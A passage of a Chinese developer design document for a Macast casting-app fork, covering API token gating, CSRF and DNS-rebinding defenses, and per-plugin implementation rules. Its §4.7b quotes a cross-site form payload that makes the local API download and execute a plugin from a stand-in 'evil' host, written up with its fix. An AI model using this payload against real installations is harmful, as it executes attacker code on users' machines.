  windows requirements 文件，而没有任何 job 会安装它，等于把 §4.3 的错反着犯一遍。
  `cheroot` 是同一族问题的另一面：`nirvana.py` 直接子类化 `cheroot.server.*`，而 cheroot
  只是 cherrypy 的传递依赖 —— 已按 darwin.txt 对 pyperclip/pyobjc 的同一条原则在
  `requirements/common.txt` 里点名。
  **pyobjc 之问有结论了**：`screen_mirror._create_aggregate` 用的 `Foundation`（以及
  `_cf_to_str` 用的 `objc`）**是合法的**，因为 `macast/utils.py` 在 `sys.platform == 'darwin'`
  下就 import 了 `AppKit` —— 同一个发行包 `pyobjc-framework-Cocoa`，核心代码先它一步依赖。
  但按 §4.3 的教训**不再让它靠 `rumps` 顺带进来**：`requirements/darwin.txt` 与 CI 的
  macOS pip 列表都点名了它，Part 30 同时守着这两处，还有两条用例守着
  `macast/plugins/renderer/screen_mirror.py` 不能把 pyobjc 提到**模块顶层**（提到了 Windows/Linux 就整个加载不了）。

索引格式、字段表与验证命令见 `plugins/README.md`。

### 4.7 网页投屏入口：GET 版即使来自本机也要求令牌

给「只能打开网址」的调用方（iOS 快捷指令、书签、`curl`、脚本）留了
`GET /api?query=cast&url=<绝对地址>&token=<令牌>`，绕开 DLNA 发现。设置页重投历史用的
`POST cast-uri` 语义保持不变。

- **GET 版必须带令牌，loopback 也不例外**：任何网页都能发一个
  `GET http://127.0.0.1:58880/api?query=cast&...`（`<img>` / `fetch`）。若沿用
  「本机即可信」，就等于随便哪个网页都能指使你的 Mac 开始播片。POST 版没这条通道，
  所以继续信任 loopback —— 但 `cast-uri` 不在 `_MANAGEMENT_PARAMS` 里，它靠的正是
  `_management_allowed()` 的本机判定，**动这里之前先想清楚 CSRF**。
- **令牌常驻**：`protocol.api_token()` 存在 `macast_setting.json` 的 `Api_Token`，
  首次使用时生成（`threading.Lock` 串行化，避免并发首用生成两个）。以前它是
  `secrets.token_hex(16)` 每进程随机、且从不显示在任何地方 —— 等于管理 API 对
  「另一台设备」永久不可用，快捷指令根本没法配。改完必须保持稳定，否则已配好的
  快捷指令会在下次启动后 403。
- 令牌出现在两处：设置页「状态 → 网页投屏入口」（可复制，附 curl 例子）和高级设置的
  JSON 里。`cast-info` 查询本身走管理门控（本机 / HTTPS / 令牌），局域网拿不到它 ——
  这是「令牌不外泄」的唯一防线，别把它从门控名单里删掉。
- 回归用例是 Part 12（19 条）。它借 CherryPy 在**无请求上下文**时给出的假 loopback
  请求真跑门控（`cherrypy.serving.request` 可直接改 `params` / `headers` / `remote` /
  `scheme`），不需要真起服务；唯一被打桩的是 `Setting.is_service_running`（GET 在服务
  未启动时会回 503）。

### 4.7b 管理 POST 的两道新门：跨站表单与"会落代码"的那三条（Part 48）

2026-09-25 实测：用户访问一个恶意网页，它向 `http://127.0.0.1:58880/api` 提交一个
`application/x-www-form-urlencoded` 的 form（**simple request，浏览器不发预检**），字段
`install-plugin=1&plugin-url=http://evil/x.py`，服务端 `_management_allowed()` 只看
`remote.ip` ⇒ 门开 ⇒ 下载 ⇒ `import` ⇒ **那个 .py 的模块级那一行以用户身份执行**
（不需要用户去启用那个渲染器）。这条链在真实例上跑通过（修复前 4/4），现在也跑得通
（修复后：两种攻击形状各自 403、插件目录与载荷标记文件都没落地；两种合法形状仍然真的装上）。
细节与验收记在 `docs/architecture-review-2026-09.md` 的 R1「已修」一节。

两道门，**缺一不可**，都在 `macast/protocol.py`：

1. **`Handler._same_site()`：所有 POST 的第一问。** `Origin` →（缺失时）`Referer`；
   两者都没有就**不是浏览器**（curl / 快捷指令 / HA），继续按地址 + 令牌判。有则归一化成
   `(host, port)`（`site_of()`：小写、去尾点、去 80/443、IPv6 去方括号），再问是不是
   这台机器自己的网址（`_page_host_names()`：回环三种拼法 ∪ `advertisable_addresses()`
   ∪ `Setting.get_advertisable_ip()` ∪ 主机名/短名/`.local`）。
   - **判据绝不是"这个域名解不解析到我"** —— DNS 重绑定下攻击者那个域**恰恰**解析到
     `127.0.0.1`，那就是这一招本身。所以是"名字比对"，不是"地址比对"。
   - **端口不参与判定**（docstring 里写着原因）：58880 被占时 Macast 自己回退到随机端口，
     钉死会把自家页面挡在外面，而这里根本没有 cookie 可骑。
   - 被拒时消息必须**同时**说出"你从哪个网址来的"和"该用哪个网址"，否则用户读到的是
     一个像令牌错的东西。
   - `Origin` 优先于 `Referer`（页面能自己挑 `Referer`），读不懂的 `Origin` 一律拒。
2. **`_CODE_EXECUTION_PARAMS` + `_code_execution_allowed()`：落代码的只认令牌。**
   `install-plugin`、`save-launch-param`（整体覆盖设置并重启）、`set-module-setting`
   （自动化钩子的键写在这里，值进 `subprocess(shell=True)`），外加 `plugin-file` 上传。
   **loopback 在这一层不算数** —— 重绑定下"本机"这个事实毫无信息量。`mirror-action`
   不在名单里，它早有自家令牌判定（§4.7 的先例）。
   用例还钉住"这一名单必须是 `_MANAGEMENT_PARAMS` 的子集"，否则可能出现"落代码却不受管"的字段。

**页面侧必须带令牌，且取不到就不发**：共享的 `management_token()`（令牌来自本机门控的
`query=cast-info`）+ `require_management_token(fd)`，五条流程各就各位 ——
`install` / `install_from_url` / `save`（高级设置）/ `post_module_setting`
（`save_module_setting` 与 `remove_module_setting` 都收口到它）/
`on_plugin_before`。**`el-upload` 自己不会带令牌**：`before-upload` 改成 `async`，
先 `await` 把令牌取回来（Element UI 会等这个 Promise，resolve 非 File 值照样继续发），
`$nextTick()` 之后 `:data="{ 'plugin-type': …, token: cast_info.token }"` 才是有值的。
套件里没有浏览器，所以页面这半份是**文本契约**（§4.13 的方法），变异体"某条流程漏带令牌"
会让对应那条变红。

**已知代价（是决定，不是待办）**：用 Macast 叫不出名字的主机名打开设置页（自建反向代理、
少见的 DNS 别名）时管理 POST 会被拒，提示让用户改用 `http://127.0.0.1:<端口>/`。
没有改成"再信 `Host` 头"，因为 `Host` 在重绑定下同样毫无信息量 —— 那条路挡不住要挡的东西。
**仍然成立的边界**：拿到令牌 = 能落代码（这是设计如此，PoC 的正控就是这么写的），
所以令牌的保密性就是这条链的强度；局域网侧拿不到令牌（`cast-info` 在门控名单里）。

### 4.8 内置插件目录（`macast/plugins/`）：15 个插件，各自的红线

`macast/plugins/` 内置 15 个第一方插件：6 个来自上游合集 `Macast-plugins`
（`iina` / `web` / `live` / `potplayer` / `pi_fm` 渲染器 + `nirvana` 协议，状态 `vendored`），
以及本 fork 自研的 9 个单文件插件（yt-dlp 下载 `macast_ytdlp` / 外部播放器 `external_player` /
小窗+壁纸 `floating` / 自动化钩子 `hooks` / Chromecast 中继 `cast_bridge` / AirPlay 音频 `raop` /
屏幕镜像 `screen_mirror` / 本地文件投屏 `cast_local_file` / AirPlay 镜像接收 `airplay_mirror`）。
这 9 个自研插件是**单文件**插件，所以：

- 只能用「Macast 已带的库 + 标准库 + 机器上已有的命令行程序」。要 pip 库就走内置插件
  路线（§4.4 的三处打包配置）。
- **Macast 一次只能选一种渲染器**：12 个渲染器类插件互斥（菜单栏切换；含上游合集的
  `iina` / `web` / `live` / `potplayer` / `pi_fm`），`raop` 与 `airplay_mirror` 是协议插件，
  可以和任意渲染器共存。
- 定位一律用 PATH + 常见安装目录（GUI 从 Finder 启动拿不到 shell 的 PATH；`yt-dlp`
  / `shairport-sync` / `uxplay` / 播放器都踩这条，且**都在插件启动时再找**，不是 import 时）。

最容易踩的几处，改这些插件前先看：

| 插件 | 红线 |
|---|---|
| yt-dlp | 下载模式**不启动 mpv**，所以它覆写了 `start/stop`，并用 `_mpv_started` 记住「mpv 到底起没起」——`MPVRenderer.stop()` 会 join 只有真起过才存在的线程。流模式把 ytdl 路径**合并进已有的 `--script-opts`**（再写一条会顶掉 OSC 的设置）。 |
| external_player | 播放器用 **argv 列表**启动，绝不拼命令行（url 来自网络）。暂停不实现，停止只杀自己起的进程。 |
| floating | 覆写 `build_mpv_params` 前先**删掉继承来的 `--geometry/--autofit/--fullscreen/--ontop-level`**，否则会和全局 Player Size 打架。壁纸模式要先探测 mpv 是否认识 `--ontop-level=desktop`：未知选项会让 mpv 起不来，而启动器的反应是重试 3 次后**把服务停掉**。 |
| hooks | 命令是 shell 命令（用户自己写的），但 **url 只走环境变量**，不拼进命令串。spawn 完即返回，不阻塞 CherryPy 工作线程。 |
| cast_bridge | 复用 `protocol_cast` 的 Cast v2 收发，不引 pychromecast。投屏序列是 deviceauth CHALLENGE → CONNECT receiver-0 → LAUNCH → CONNECT transportId → LOAD，`transportId` 来自 LAUNCH 的回复，**不要硬编码**。发现用 mDNS 且必须在后台跑（`build_menu` 在 UI 线程上）。 |
| raop | 只监督 shairport-sync（生成最小配置 + 拉起 + 报连接/断开），**不**把 RAOP 映射成 DLNA 播放状态。`uses_ssdp = False`，否则只有它启用时也会把 SSDP 服务拉起来。v0.2 起有第一个持久化配置 `RAOP_Device_Name`（覆盖服务名，缺省跟随友好名；见 §4.11）。 |
| airplay_mirror | 只监督 **uxplay**（iPhone 的「屏幕镜像」列表里那个接收端在这台 Mac 上就是它），`uses_ssdp = False`，**不**映射 DLNA 播放状态 —— 它和 `raop.py` 是同一族形状。红线五条，全部来自上游源码而不是试错：① **配置走 `-rc <file>`，绝不走 `$UXPLAYRC`** —— 后者在文件不存在时**静默回落 `~/.uxplayrc`**，等于读（甚至被诱导写）用户主目录里的配置；文件写在 `utils.SETTING_DIR` 里，用户附加项**放在末尾**所以能覆盖我们的默认值（rc 后写的赢，argv 又在 rc 之后解析）。② **绝不加 `-p`**：`-p` 是 legacy 固定端口 7100/7000/7001，7000 正是自家 `AIRPLAY_PORT` 和 macOS 自带接收端的地盘；不带 `-p` 时 uxplay 用动态端口并写进自己的 mDNS TXT，发送端照它连，固定端口只有坏处。③ **stdout 必须挂在 pty 上**：uxplay 的 `log()` 是 `printf`，全程序只有一处 `fflush`（音频进度），挂管道 ⇒ **块缓冲** ⇒ "谁连上了"永远不出现；POSIX 用 `pty.openpty()`，Windows 退回管道（用例直接问 `os.isatty(read_fd)` 来守这个契约，比测时序稳）。**父进程必须 `os.close(child_fd)`**，否则读线程永远等不到 EOF。④ **退出上报要认身份**（`self._proc is not proc` 就闭嘴）：`reload()` 之后旧 reader 若照常上报，用户看到的是"uxplay 已退出"而它其实活得好好的。⑤ **与 `raop.py` 抢同一个 mDNS 名字**（uxplay 是完整的 AirPlay 接收端：镜像 + RAOP），所以两个都启用时 iPhone 只有一个入口 —— 不猜、不改名，只在启动时按**已启用协议标题**提示一次（判定要归一化 `lower().replace(' protocol','')`，`"AirPlay Protocol"` 才是内置接收端的真标题，见 §4.2）。**找不到二进制是正常状态不是 bug**：macOS 没有 Homebrew formula、官方 release 不含二进制，必须自己编译 ⇒ 提示里给完整配方而不是"装一下 uxplay"（`selfcheck.py` 给同一段）。 |
| cast_local_file | 直通/转码**按 ffprobe 逐文件判断**，不按扩展名猜（`COPY_CONTAINERS` / `COPY_VIDEO_CODECS` / `COPY_AUDIO_CODECS` 三张表 + `plan()` 的理由字符串会直接出现在菜单里）。转码路径写**会一直变大的临时文件**而不是管道 —— 管道没长度、不能重连、不能拖动，而 DLNA 接收端**根本不播**报不出长度的流；对外长度 = 时长 × 码率并压在 `MAX_ADVERTISED_SIZE = 1.9 GB` 之下（老固件在有符号 32 位里做这件事），被这个上限卡住时**降码率**而不是谎报长度。**HTTP 语义三条红线**：① `parse_range(None)` 回 `(0, None)` 是「从头」= 整文件答案，**不是** partial —— 只有客户端真发了 `Range` 才配 206 + `Content-Range`，否则 200 且不发 `Content-Range`（写成 `spec = parse_range(header)` 的代价就是"整文件读也回 206"，Part 25 三条用例抓住它）；② 注册过但**已经消失**的文件必须拒答（`total == 0 and entry.job is None` → `_refuse()`），回一个没有长度的 200 会让播放器永远等字节；③ 读超过写入速度时**等**而不是回短答案。**音轨/字幕/`AudioDelay` 只在转码路径存在**，选了非默认音轨就**改判**为转码（直通是把原始字节交出去，设备的轨道表没法从这边重排）。字幕分三条路：Cast 转 **WebVTT** 进 `LOAD.textTracks[].contentId`、转码路径在**这个 ffmpeg 有 libass** 时烧进画面、DLNA 两条都没有。**停止发 QUIT_APP 不只是 STOP**：只 STOP 会把接收端 app 停在最后一帧，而且**我们自己的 Cast 接收端**也会继续声称还在播那部片子（Part 25 里那条 A/B 就是打在 `macast/protocol_cast.py` 的会话账本上的）。看门狗重投**有预算**（`MAX_REPUSH = 3`，`_begin(retry)` 不吃重投带来的新预算），第 4 次就认输并说明原因；被抢占后重投要按设备上报位置 `Seek`（DLNA 是 `H:MM:SS` 文本）。发现与能力探测（VideoToolbox / libass / 音频采集口）**一律不在 UI 线程**，`_tool_cache` 按工具分键缓存。**avfoundation 的设备表要同时认两种拼写**：真 ffmpeg 打的是 `AVFoundation audio devices:` + 不带引号的 `[0] 名称`，历史上按 `"名称"` 解析的版本**在这台机器上一条都读不到**（症状是"系统声音档位永远说没有采集口"，而不是报错）。发给设备的 SOAP 与其 UTF-8 `Content-Length` 同 screen_mirror 条 ⑤ 的红线（按字节数算，`len(str)` 会被中文设备名截断）。 |
| screen_mirror | 实时链路：ffmpeg 截屏（darwin avfoundation / win32 gdigrab / linux x11grab，**Wayland 不支持要明说**；`-list_devices` 的真实形状是 `AVFoundation video devices:` + `[N] name`，**没有引号**，见 §4.2 末条）→ 插件内 HTTP 服务持续吐一条实时流 → **封装由「输出目标」决定**（`cast` → `video/mp2t` + Cast `LOAD streamType=LIVE`；`browser` → 分片 MP4 `frag_keyframe+empty_moov+default_base_moof` + 自带 MSE 播放页（**页面上有一块 YouTube 那样的推流统计浮层**，顶栏「统计」开关 + `localStorage` 记住；三组数字 = 打开页面时一次性注入的 `page_diag(session)` + 每秒轮 `/browser/stats` 拿发送端计数器 + 播放器自己算的码率/积压/距直播边缘/掉帧。**红线三条**：① 那个端点**只能用 `page_token`**（和页面同一道 `hmac.compare_digest`），**绝不能用常驻 `Api_Token`** —— 观看 URL 会被转发，管理令牌泄露一次等于永久开放管理 API；② **正文里不许再抄一遍 token**（JS 从自己所在的 URL 读回来），且全部文字走 `textContent`；③ 浮层与设置页「统计信息」卡片**必须读同一批计数器**（`page_stats` 与 `stats()` 各自只是转发 `session` + `broadcaster`），谁都不许另算一份 —— 两处答案不一致比没有数字更糟；④ **`PLAYER_PAGE` 必须是 raw 串**（2026-09-24 真浏览器验收：内嵌 JS 的 `'\n'` 被非 raw 的 Python 字符串吃掉 ⇒ 页面抛 `SyntaxError`、面板全空、按钮死、视频不播，而**当时 18 条 Python 用例全绿**；现在用例扫服务端真正吐出的那份 JS：任何 JS 字符串不许跨真实换行，数撇号前先剥掉 `//` 注释）；⑤ **两个"每秒"单位不许共用一个格式化函数**（档位是 bit/s、流量计数器是 byte/s，混用的结果是 4 Mbps 印成 32 Mbps），且**帧率报两个数**：窗口被遮挡时 Chrome 只给 1–2 fps 上屏而解码照旧 24 fps，只报上屏就会把浏览器节流读成"镜像坏了"。它**只在浏览器目标存在**：电视上的画面不在我们手里）。`dlna` → 见下「伪装成文件」）。**编码器不是平台决定的**：`auto` 一旦能力探测给过答案就落在 VideoToolbox（`has_hardware_encoder()` 会 spawn ffmpeg 问一次，缓存**按 ffmpeg + 平台**分键，探测只在后台跑，绝不在 UI 线程上 spawn），因为 CPU x264 撑不住 Retina 桌面的实时帧率 —— 用户报的"不开硬件编码几乎看不到画面"是这个意思，不是 bug；显式选的档位仍然被尊重，而一台其实没有硬件编码的机器在**启动时**（不是在判断时）回落 x264。**v0.10 起控制面板整个搬进设置页的「电脑投屏」tab，v0.12 起菜单栏里一条镜像行都没有，只剩通知**（停止走 tab、「停止接受投屏」或换渲染器，三条路都汇到同一个 teardown）。**慢消费者丢整块、绝不阻塞读管道**（阻塞会把编码器冻住；"丢整块"从 v0.10 起是真的整块 —— fMP4 按 `moof+mdat` 一片、TS 按 188 字节一包对齐丢弃，边界落在半包上时后加入的观看端永远对不齐；队列按**秒**预算而不是字节，`LIVE_QUEUE_SECONDS` ≈0.75 s，档位码率改的是队列块数）；ffmpeg 进程和 HTTP 服务**一启动就移交 renderer 持有**，终止统一由 pump 线程按 generation 判定上报（否则权限被拒会静默黑屏、或双线程抢清理）。杀掉/让位前先增 generation，让 pump 的死亡上报闭嘴。**重播不对称**（红线）：浏览器会话重播 init segment + 8 MiB 环形尾部，cast（Chromecast）会话永远只拿「接下来」的字节 —— 给电视重播积压 = 它此后一直慢几秒；`dlna` 会话是第三种形状：**按绝对字节偏移**从 48 MiB 环形缓冲里取（电视把它当文件读，会 HEAD、探边界、断线重连同一偏移），见下「伪装成文件」。**`_retain` 里 init 头必须切到第一个 `moof` 才算完**（晚加入的观看端拿双份头 = 花屏，别把它想成"缓存一点前缀"）。观看地址带**每会话随机**的 `stream_id` + `page_token`（`hmac.compare_digest` 常量时间比对），**故意不用应用的常驻 `Api_Token`** —— 那是管理令牌，泄露一次等于永久开放整套管理 API，而镜像页 URL 会被复制/转发/贴进群。页面 JS 只用 `textContent`，响应带 `nosniff` + `no-store`。DLNA 推流来时**让位**并转投该 URL（Bridge 行为）—— **cast 与 dlna 两个电视目标都会**；浏览器目标下推送会被明确拒绝而不是杀镜像（`set_media_url` 的守卫顺序：空 url → 同一 URL 重复推 → 无目标；"无目标"按当前 kind 分别查 `target()` / `dlna_target()`，**别只查一个**，否则浏览器目标会误以为有中继对象）。镜像期间 `caffeinate -dimsu` 持有休眠断言，teardown 释放。**系统声音只在有采集口时开**：macOS 认 BlackHole 设备（FFmpeg 发行版至今抓不了 mac 系统音频）、Linux 认 pulse `<sink>.monitor`、Windows 仅画面；探测结果缓存在 `_capture_cache`（键含 cursor —— 指针开关会改采集命令，改指针/屏幕要 `invalidate_capture_cache()`）。**「一轮搜索没结果」不是一句话，是五种机器状态**（v0.10/v0.12）：正在搜 / 真的没人应答 / 只有这台 Mac 自己的接收端（已被滤掉）/ 应答了但描述拉不到 / 网络侧读不到网卡 —— 判定收在 `_search_words(...)` 一处，**每一格都必须给出下一步**（电视是否开机、是否在同一个网络、点「重搜设备」）。两个曾被踩空的细节：① **一条 M-SEARCH 不等于搜过一次** —— 刚唤醒的接收端还没加入组播组，所以一轮发两条（间隔 timeout×0.45）；② 钉住网卡时组播要显式设 `IP_MULTICAST_IF` 从那个口出去，光设源地址不够；没钉网卡时**不要猜出口**，交给内核，猜错会让虚拟机网桥把搜索吞掉。**「有采集口」和「声音真的进得来」是两件事**（v0.12）：聚合设备建好、默认输出切过去，都不保证 ffmpeg 那一路听得见 —— 所以控制台问的是**当前默认输出设备的 UID** 是不是采集用的那块设备（`system_audio_routed()`），页面据此区分「已启用」与「有声音进来」，而不是只报一个"装好了"。**读不到的音频口会饿死整条采集，而且一句话都不说**（2026-09-23 在装好的 `.app` 上实测）：avfoundation 把系统声音当作**麦克风**输入，麦克风授权没给（或 BlackHole 那头没人喂时钟）时它不报错，而是**连画面也不再产帧**；3 秒预算到点后 ffmpeg 只留下两句在**正常采集里也会出现**的运行时噪声（`objc[…]: class \`NSKVONotifying_AVCaptureScreenInput' not linked` 和 `Configuration of video device failed, falling back to default.`），把它们当成原因就是误导 —— 同一台机器、同一条命令，把音频口拿掉 6 秒就写出 3.9 MB H.264。现在三处收口：`FFMPEG_NOISE` 把"健康采集也会打"的行挡在消息之外（日志照旧全留）、无帧时先用 `video_only_capture()` **降级成只采画面**（杀进程前**先增 generation**，否则 pump 会把我们自己这一刀报成"采集中断"）、每一条"没有返回画面"都必须给出门（`PERMISSION_DOOR`）与「勾选后重启 Macast」，降级成功的通知也要说出少了声音和去哪补（`AUDIO_DROPPED_SUFFIX` 点名麦克风），**并且这句话必须活在页面上而不只是一次性通知**（`renderer.audio_dropped()` 是会话自己的答案，`_status_line` 挂 `AUDIO_DROPPED_MARK`、`_audio_line(renderer)` 在会话弃声时不再说「已启用」—— 通知闪过就没了，「系统声音：已启用」配上一条无声的镜像正是 v0.12 要终结的那个谎）。回归用例 Part 38。**通知本身不是「清理」的前置条件**（2026-09-24 Windows 实测崩溃）：pystray 的气泡缓冲是
`szInfo[256]` / `szInfoTitle[64]` **字符**（不是字节），超了 ctypes 直接抛 `ValueError: string too long`，
而 `cherrypy.engine.publish('app_notify', …)` 会把订阅者的异常原样抛回**发布方线程** —— 于是 `_fail()`
炸在它自己的 `notify()` 那一行，调用者写在**下一行**的 `_teardown()` 被跳过：页面读「未镜像」而 ffmpeg 与观看
HTTP 服务还在跑。修在边界上，两层：`gui.fit_notification()` 把超长文案压进缓冲且**保留头 + 尾**、中间挂
「……（全文见设置页「电脑投屏」的活动）」（尾巴才是可执行的那半句，砍尾等于违背本行「每一条失败必须给出门」），
`screen_mirror.notify()` 吞掉 publish 失败并记 warning。用例：Part 36 的假托盘按真缓冲宽度拒收，Part 38 用
一个抛异常的订阅者证明 `_teardown` 仍然跑到；真机侧用真 `NOTIFYICONDATAW` 量过（不截断必抛、截断后正好 256）。
CoreAudio 聚合字典的读法在本机 CLI 沙箱里问不出来（SDK 缺 `AutoHAGTypes.h`、带缓冲才回 `!dat`），**这一条判定要在真 Mac 上验收**，别把它写成已验证。**v0.3 起一键辅助装 BlackHole**（设置页「电脑投屏」→「系统声音 → 一键设置」）：地址与 sha256 以 Homebrew cask API 为准（拉不到用 PINNED 兜底）→ `open` 图形安装器（用户输一次密码，.pkg 无法静默装，**别把它想成全自动**）→ 轮询设备出现 → ctypes 调 CoreAudio 建/复用**多输出聚合设备**并切默认输出（UID `com.macast.screenmirror.output`，原默认存 `Mirror_Audio_Original` 供「恢复原声音输出」）；**任何一步失败降级为打开「音频 MIDI 设置」+ 文字指引**。
**v0.7/v0.9 修的是"一键设置安装失败"的三类真实根因**（症状都是「装了却没有设备」，旧流程只会说"安装被取消了吗？"）：
① **pkgutil 残留记录但驱动文件已不在磁盘** —— `_blackhole_receipt_present()`（问 pkgutil 记录）与
`_blackhole_driver_installed()`（glob `/Library/Audio/Plug-Ins/HAL/BlackHole*.driver`）是**两个问题**，
**别拿记录当安装状态**；检测到"记录在、文件没在"就直接重装并在 probe 步骤里说清楚原因。
② **官方 .pkg 的 postinstall 只 chown/chmod，从不重启 coreaudiod** —— 驱动落了盘但守护进程永远不加载；
等设备安装超时后若发现"文件在盘上但列表里没有"，用 osascript `do shell script … with administrator privileges`
**征求一次管理员密码**重载 coreaudiod 再等 45 秒（`-128` = 用户取消密码框，要如实报"你取消了密码框"，
**别伪装成超时**）。
③ **probe 分支"把跳过写成了一个句子"**（v0.9，就是用户报的"重启后再点一键安装又要安装一遍，永远装不完"）——
旧代码在"驱动文件在磁盘上"时打印 `安装会被跳过`，然后**照样 fall through** 到 meta/download/verify/install，
于是每次点一键都重新下载一个 pkg、再开一次安装器，而 `reload` 只有等满 300 秒超时才可达。
修法是把判定收成一个值：**`_blackhole_state(ffmpeg)` 五态**（capturable / loaded / on-disk / stale-receipt / absent），
**"跳过"必须是步骤机里的 skipped 状态，不是 note 里的话**。两个见证者必须分开报：
avfoundation（`_has_blackhole`，采集真正会用的那一个）与 CoreAudio（`_find_blackhole`，无权限门槛）不一致时
是**麦克风权限**问题，重装 pkg 永远修不好 —— 这一支照样建聚合设备、切默认输出，但**结尾不许说"已就绪"**：
把 `probe` 改标失败（步骤机允许：这一轮的真实结论就是那个否定答案，绿色的页面 + 没有声音 = 原来那个幻觉），
并点名「系统设置 → 隐私与安全性 → 麦克风」（`.app` 缺 `NSMicrophoneUsageDescription` 时系统连弹窗都不给，
声明在 `scripts/setup_py2app.py`）。**每一支失败文案都要说出"再点一次不会重新下载"**。
整套流程走 `_SetupProgress` 步骤机（env/probe/meta/download/verify/install/wait/reload/aggregate/output；
**done 步骤拒绝重入 = 进度条永不回退**；skipped 不进分母），同时起一个 **127.0.0.1 随机端口**的实时进度页
（每轮随机 token + `hmac.compare_digest`，同样**绝不用常驻 `Api_Token`**；nosniff+no-store；textContent-only；
跑完保留 300 秒可读再自动关；**页面起不来不算安装失败**——通知里仍带每一步）。
失败必须**指名到底哪一步**：`_route_audio_through_blackhole` 内部把"聚合设备"与"切默认输出"分开标失败，
外层不再 blindly fail('aggregate')（否则"设备建成了但切换失败"会谎称创建失败）。CoreAudio 的坑：`kAudioObjectSystemObject` 是 **1**（0x1000 是 hardware model，问它要设备列表回 `'nope'`）；`inDataSize` 是 `size_t`；NULL-data 的探测在本机被拒——直接带大缓冲问。CLI 沙箱里设备枚举不可用（只有 `dOut` 通），所以这套 ctypes **要在真 Mac 上验收**；读接口都在，测试只打桩不触碰。**v0.5 的 DLNA 电视目标 = 把直播伪装成一个文件**（MirrorCast 那一族的做法），红线集中在四处：① `Content-Length` 必须是**按档位码率算出来的固定值且 < 2³¹**（老固件用有符号 32 位记长度，报 `-1`/报超大都不播），时长与 `Duration` 要和这个长度自洽；② 每次响应都要带 `Accept-Ranges: bytes` + `transferMode.dlna.org: Streaming` + `contentFeatures.dlna.org`，探边界的请求要**恰好**回 n 字节（不足用 MPEG-PS 填充包 `00 00 01 BE 00 00` 补），206 才配 `Content-Range`（**没带 Range 的请求即使语义上是"整个文件"也必须回 200 且不发 `Content-Range`**，`bounded` 和 `has_range` 是两件事）；③ 推流前先攒 `dlna_prefill_bytes(profile)`（= 档位总码率 × `DLNA_PREFILL_SECONDS`，夹在 2–8 MiB，v0.10 前是写死的约 20 MiB）再交给电视，代价是**看得见说得出的延迟**（默认画质下五档都是约 4 秒 = `DLNA_PREFILL_SECONDS` × 码率，状态行/开始提示都要报秒数），环外偏移要报丢块而不是回错字节（`_ByteLog.read` 里 `max(absolute, _start)` 的钳制不能省 —— 负数切片会真的把**新**数据当成旧偏移发出去）；④ **档位**（`DLNA_PROFILES`：ps-pal / ps-ntsc / ts-mpeg2 / ts-h264 / mkv-h264）决定封装、帧率、帧尺寸、`-g` 和**音频编码**（PAL/NTSC 用 AC-3 不用 AAC，DVD 时代的电视不认），看门狗每 5 秒 `GetTransportInfo`，掉出 `PLAYING` 重投 URL，`RelTime` 在动才算活着。**v0.17 起"连续失败自动换下一档"是真的换，不再只是提示**（`_rotate_dlna_profile`）：一次运行最多 `DLNA_MAX_PROFILE_TRIES = len(DLNA_PROFILES) - 1` 档，每一步 = 重启编码器（比一次重投贵几秒），所以四条边界必须同时成立 —— a) **只在证据指向"容器被拒"时换**：`misses >= DLNA_MAX_REPUSHES`，或 `exchanges` 动了而 `written` 没动连续 `DLNA_MAX_REFUSALS` 次；b) **「伪装成文件」形状永不换档**（`session.bytelog` 为真直接 `return False`）—— 那里的失败是"电视拿一个伪造长度去尾部找不存在的索引"，换五个容器也换不出来，`_give_up` 早就在说换形状，换档会把那句话埋掉；c) **绝不写用户的选择**：阶梯只在实例上（`_profile_id` / `_profile_tries`），`start_mirror` 清空它，`Mirror_Dlna_Profile` 一个字节都不动 —— 所以页面上亮的档位（`dlna_profile_display()`，**由 renderer 回答**）与设置里存的**可以不一致**，而 `_run_mirror` 只**问一次**（`active_dlna_profile()` 的返回值同时交给 session 与 ffmpeg argv；两处各问一次就是"画面档位与 argv 档位分家"的来源，Part 23 有两条**纯文本**用例守着这一条，因为它们问的是"谁在什么地方问")；d) **换档前先增 generation 再 `_teardown()`**（本行末尾那条通用红线在这里同样成立），且 `_teardown` 必须同步做完，否则紧随其后的 `start_mirror` 会看见 `_starting` 还挂着而静默什么都不做 —— 一个停在第 2 档的阶梯比没有阶梯更糟。**放弃（`_give_up`）之后要 `_retire_session()`**：`_fail` 只把 `_mirroring` 关掉，此前没有任何东西去关 ffmpeg 与 HTTP 服务，于是页面读「未镜像」而采集其实还在跑。**默认档位随形状走**（`default_dlna_profile_id(shape)`）：直播形状 = `ts-h264`，伪装成文件 = `ps-pal`（那一档本来就是为 DVD 时代固件留的，而我们**没有**老电视可验）。理由是量出来的（同一台 Mac、同一接收端、同一编码器、20 秒 A/B 跑两轮）：`ps-pal` 首帧 5.86 秒 / 稳定 5.08，`ts-mpeg2` 首帧 2.47 / 稳定 2.15，而这两档载荷逐字节等价（同为 mpeg2video + AC-3、同 CBR、同 25 fps、同 720×576）—— **3.4 秒是容器要的，且开局晚就全程晚**（两边位置都以 1.00x 前进）。机制两条：`-preload` 给 vob 刻进 `start_time 0.534667`（`-preload 0` 是 0.034667，实测 5.86 → 5.30，**故意不发**：PS 的 VRV 模型靠这段交错余量活着，下溢会刷警告加花屏），以及 MPEG-PS 自我确认弱（`ffprobe probe_score` PS 26 / TS 100 ⇒ 接收端多留 1.1–1.4 秒探测缓存）。**`-muxrate` 是被证伪的第三个嫌疑**（明写 10080000、真实码率、20160k 三个都落在 as-shipped 上）。五档的数（`DLNA_PROFILE_LATENCY`）与它的**限定语**（`DLNA_PROFILE_LATENCY_SCOPE`：接收端是本机另一台 mpv/Macast，**不是真老电视**）一起显示在设置页「兼容档位」的 `title` 上，用例逐条比这两处文案 —— **表格与限定语必须同时出现**，只给数字就是把手边的接收端当成全世界的电视。**测试契约跟着 renderer 的脸走**：`console_state()` 问的是 renderer 的 `dlna_profile_display()`，所以每个假 renderer（`_FakeMirror22`、`_FakeMirror23`、Part 35 的 `types.SimpleNamespace`）都得有它，少一个就是一个 AttributeError 打断整个 Part。还有 Part 23 那台假电视多了一个 `refuse` 开关：**"取走地址却一个字节都不读"这一格必须由它把 `Play` 也答成 STOPPED** —— 我们的重投本身就会让一个配合的设备进 PLAYING，而假设备照默认动作回 PLAYING 时看门狗什么都不做是**正确行为**，用例却会把它读成"回退逻辑坏了"（它第一次写出来时的红法正是这个）。**发送端（我们）自己的 SOAP 也有一条红线**：`Content-Length` 必须按 **UTF-8 字节数**算，`len(str)` 会让带中文设备名的 DIDL 在局域网里被**截断**（电视回 SOAP Fault，症状是"电视没反应"而不是"我们发错了"）。发现侧：控制 URL 可能是相对路径，也可能是设备自称的另一地址/漏端口 —— 以**实际应答的地址+端口**为准（`parse_description` 里 `netloc` 而不是 `hostname`，端口用 